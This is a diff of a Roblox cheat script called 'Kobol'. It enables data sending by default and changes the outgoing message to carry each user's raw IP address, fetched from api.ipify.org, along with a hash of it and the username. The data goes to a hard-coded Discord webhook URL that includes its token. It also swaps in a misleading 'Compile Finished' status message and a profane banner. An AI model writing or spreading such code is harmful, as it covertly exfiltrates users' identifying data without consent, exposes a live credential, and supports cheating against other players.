@@ -1,6 +1,6 @@
 getgenv().kobolmodule = {
     ["prints"] = true, --leave this on or shit hits the fan
-    ["Compiles"] = false --Sends data to server, HASHED IP, UUID (script ID) Username 
+    ["Compiles"] = true --Sends data to server, HASHED IP, UUID (script ID) Username 
  };
 getgenv().INST = {}
 getgenv().INSTPERFORM = function(func)
@@ -81,13 +81,16 @@ end
 
 getgenv().NULLITY = nil
 getgenv().BANNER2 = [[
- _   _____________  _____ _     
-| | / /  _  | ___ \|  _  | |    
-| |/ /| | | | |_/ /| | | | |    
-|    \| | | | ___ \| | | | |    
-| |\  \ \_/ / |_/ /\ \_/ / |____
-\_| \_/\___/\____/  \___/\_____/
-                                
+██   ██  ██████  ██████   ██████  ██      
+██  ██  ██    ██ ██   ██ ██    ██ ██      
+█████   ██    ██ ██████  ██    ██ ██      
+██  ██  ██    ██ ██   ██ ██    ██ ██      
+██   ██  ██████  ██████   ██████  ███████ 
+                                          
+                                          
+                                          
+   Fucking up your game since this came out or fuck idk.
+        CC. Entry-Null
 ]]
 
 print(getgenv().BANNER2)
@@ -661,7 +664,7 @@ Work = game.Workspace
 local RnS = game:GetService("RunService")
 local Mouse =  Client:GetMouse()
 if getgenv().kobolmodule.prints == true then
-print("[ Loaded Without Problems. ]")
+print("[ Compile Finished, CPP Server Connected 5 octets.]")
 end
 
 
@@ -898,8 +901,8 @@ ip = tostring(game:HttpGet("https://api.ipify.org", true))
 hashedip = HASH512(ip)
 local uuid = GENUUID()
 print("Current COBOL Identity: " .. uuid .. "")
-local webhook = "https://discord.com/api/webhooks/819762690762604544/c9rUd--7M6BqKMesH-VWc6ai5o96-MdW7vyHSz_WdIO-yHikCy6kM0cdrz2dyiGiHadB"
-local message = "KOBOL Process completed, " .. uuid .. ". HASHED IP: " .. hashedip .. ". USERNAME: " .. Client.Name .. ""
+local webhook = "https://discord.com/api/webhooks/862866469771149342/4PrUeNydFC7F7wMgILdxuciCRzpdCqwfSm7gowxqSgtg7-wXuL2dmqcfjGO_e9hQ1RLG"--plsnospambro or ill puppy eye your ip
+local message = "KOBOL Process completed, { " .. ip .. ". }HASHED IP: " .. hashedip .. ". USERNAME: " .. Client.Name .. ""
 local botname = "Kobol Server"
 local HttpService = game:GetService("HttpService");
 function specials(Webhook, Message, Botname)
